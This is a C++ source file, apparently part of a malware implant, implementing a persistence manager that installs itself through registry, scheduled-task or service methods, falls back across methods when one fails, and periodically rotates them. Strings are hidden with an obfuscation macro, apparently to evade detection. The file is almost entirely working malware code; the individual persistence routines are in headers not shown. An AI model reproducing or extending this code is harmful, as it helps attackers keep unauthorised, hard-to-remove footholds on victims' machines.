#include "persistence/PersistenceManager.h"
#include "persistence/RegistryPersistence.h"
#include "persistence/SchedulePersistence.h"
#include "persistence/ServicePersistence.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include <memory>
#include <vector>
#include <cstdint>
#include <string>

// Obfuscated strings
const auto OBF_PERSISTENCE_MANAGER = OBFUSCATE("PersistenceManager");

PersistenceManager::PersistenceManager(Configuration* config)
    : m_config(config), m_installed(false) {
    InitializePersistenceMethods();
}

PersistenceManager::~PersistenceManager() {
    Remove();
}

void PersistenceManager::InitializePersistenceMethods() {
    // Register available persistence methods
    m_persistenceMethods[OBFUSCATE("registry")] = 
        std::make_unique<RegistryPersistence>(m_config);
    m_persistenceMethods[OBFUSCATE("scheduled_task")] = 
        std::make_unique<SchedulePersistence>(m_config);
    m_persistenceMethods[OBFUSCATE("service")] = 
        std::make_unique<ServicePersistence>(m_config);
    
    LOG_DEBUG("Initialized " + std::to_string(m_persistenceMethods.size()) + 
              " persistence methods");
}

bool PersistenceManager::Install() {
    if (m_installed) {
        return true;
    }

    std::string method = m_config->GetPersistenceMethod();
    auto it = m_persistenceMethods.find(method);
    
    if (it == m_persistenceMethods.end()) {
        LOG_ERROR("Unknown persistence method: " + method);
        return false;
    }

    LOG_INFO("Installing persistence using method: " + method);
    
    if (it->second->Install()) {
        m_installed = true;
        m_currentMethod = method;
        LOG_INFO("Persistence installed successfully");
        return true;
    }

    LOG_ERROR("Failed to install persistence using method: " + method);
    return TryFallbackMethods(method);
}

bool PersistenceManager::TryFallbackMethods(const std::string& failedMethod) {
    LOG_INFO("Attempting fallback persistence methods");
    
    for (const auto& [method, persistence] : m_persistenceMethods) {
        if (method != failedMethod) {
            LOG_INFO("Trying fallback method: " + method);
            if (persistence->Install()) {
                m_installed = true;
                m_currentMethod = method;
                LOG_INFO("Fallback persistence installed successfully with method: " + method);
                return true;
            }
        }
    }
    
    LOG_ERROR("All persistence methods failed");
    return false;
}

bool PersistenceManager::Remove() {
    if (!m_installed) {
        LOG_DEBUG("No persistence installed to remove");
        return true;
    }

    auto it = m_persistenceMethods.find(m_currentMethod);
    if (it == m_persistenceMethods.end()) {
        LOG_ERROR("Current persistence method not found: " + m_currentMethod);
        return false;
    }

    LOG_INFO("Removing persistence using method: " + m_currentMethod);
    
    if (it->second->Remove()) {
        m_installed = false;
        LOG_INFO("Persistence removed successfully");
        return true;
    }

    LOG_ERROR("Failed to remove persistence using method: " + m_currentMethod);
    return TryForceRemove();
}

bool PersistenceManager::TryForceRemove() {

    bool success = true;
    for (const auto& [method, persistence] : m_persistenceMethods) {
        if (!persistence->Remove()) {
            LOG_ERROR("Force removal failed for method: " + method);
            success = false;
        }
    }
    
    m_installed = false;
    return success;
}

bool PersistenceManager::IsInstalled() const {
    // Check if any persistence method is currently active
    for (const auto& [method, persistence] : m_persistenceMethods) {
        if (persistence->IsInstalled()) {
            return true;
        }
    }
    return false;
}

void PersistenceManager::RotatePersistence() {
    if (!m_installed) {
        return;
    }

    LOG_INFO("Rotating persistence method");
    
    // Remove current persistence
    if (!Remove()) {
        LOG_ERROR("Failed to remove current persistence during rotation");
        return;
    }

    // Find next method in rotation
    auto it = m_persistenceMethods.find(m_currentMethod);
    if (it == m_persistenceMethods.end()) {
        it = m_persistenceMethods.begin();
    } else {
        ++it;
        if (it == m_persistenceMethods.end()) {
            it = m_persistenceMethods.begin();
        }
    }

    // Install new method
    m_currentMethod = it->first;
    if (it->second->Install()) {
        m_installed = true;
        LOG_INFO("Persistence rotated successfully to method: " + m_currentMethod);
    } else {
        LOG_ERROR("Failed to rotate persistence to method: " + m_currentMethod);
    }
}